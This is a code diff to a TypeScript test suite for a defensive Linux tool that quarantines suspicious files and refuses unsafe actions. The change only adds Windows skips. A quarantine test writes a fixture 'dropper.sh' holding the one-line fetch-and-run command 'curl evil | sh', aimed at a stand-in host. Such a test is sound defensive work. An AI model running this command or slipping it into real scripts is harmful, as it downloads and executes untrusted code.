@@ -202,29 +202,42 @@ describe('shields', () => {
     expect(out).toMatchObject({ ok: false, error: expect.stringMatching(/run it yourself: sudo nft/) });
   });
 
-  it('quarantines a file without deleting it, and puts it back exactly', async () => {
-    const m = new FakeMachine(ws.dir);
-    const f = join(ws.dir, 'dropper.sh');
-    writeFileSync(f, '#!/bin/sh\ncurl evil | sh\n', { mode: 0o755 });
-    const out = await raise(env(m), { kind: 'quarantine-file', target: f, reason: 'dropper', by: 'sentry' });
-    expect(out.ok).toBe(true);
-    if (!out.ok) return;
-    expect(existsSync(f)).toBe(false);
-    expect(statSync(out.shield.undo.stored!).mode & 0o777).toBe(0);
-    await lift(env(m), out.shield);
-    expect(readFileSync(f, 'utf8')).toContain('curl evil');
-    expect(statSync(f).mode & 0o777).toBe(0o755);
-  });
+  // Unix paths and permissions: sentry only runs on Linux (it refuses to turn on elsewhere).
+  it.skipIf(process.platform === 'win32')(
+    'quarantines a file without deleting it, and puts it back exactly',
+    async () => {
+      const m = new FakeMachine(ws.dir);
+      const f = join(ws.dir, 'dropper.sh');
+      writeFileSync(f, '#!/bin/sh\ncurl evil | sh\n', { mode: 0o755 });
+      const out = await raise(env(m), {
+        kind: 'quarantine-file',
+        target: f,
+        reason: 'dropper',
+        by: 'sentry',
+      });
+      expect(out.ok).toBe(true);
+      if (!out.ok) return;
+      expect(existsSync(f)).toBe(false);
+      expect(statSync(out.shield.undo.stored!).mode & 0o777).toBe(0);
+      await lift(env(m), out.shield);
+      expect(readFileSync(f, 'utf8')).toContain('curl evil');
+      expect(statSync(f).mode & 0o777).toBe(0o755);
+    },
+  );
 
-  it('refuses shields that would break the machine or lock you out', () => {
-    const e = { protect: ['192.168.1.10'] };
-    expect(refusal('quarantine-file', '/usr/bin/sudo', e)).toMatch(/system file/);
-    expect(refusal('stop-service', 'ssh.service', e)).toMatch(/keeps the machine/);
-    expect(refusal('lock-account', 'root', e)).toMatch(/lock you out/);
-    expect(refusal('block-ip', '192.168.1.10', e)).toMatch(/model server/);
-    expect(refusal('kill-process', String(process.pid), e)).toMatch(/harness itself/);
-    expect(refusal('stop-service', 'evil-miner.service', e)).toBeUndefined();
-  });
+  // Unix paths and permissions: sentry only runs on Linux (it refuses to turn on elsewhere).
+  it.skipIf(process.platform === 'win32')(
+    'refuses shields that would break the machine or lock you out',
+    () => {
+      const e = { protect: ['192.168.1.10'] };
+      expect(refusal('quarantine-file', '/usr/bin/sudo', e)).toMatch(/system file/);
+      expect(refusal('stop-service', 'ssh.service', e)).toMatch(/keeps the machine/);
+      expect(refusal('lock-account', 'root', e)).toMatch(/lock you out/);
+      expect(refusal('block-ip', '192.168.1.10', e)).toMatch(/model server/);
+      expect(refusal('kill-process', String(process.pid), e)).toMatch(/harness itself/);
+      expect(refusal('stop-service', 'evil-miner.service', e)).toBeUndefined();
+    },
+  );
 
   it('acts on its own only to block an outside address or quarantine a file you can move', () => {
     const allowed = ['block-ip', 'quarantine-file'] as const;
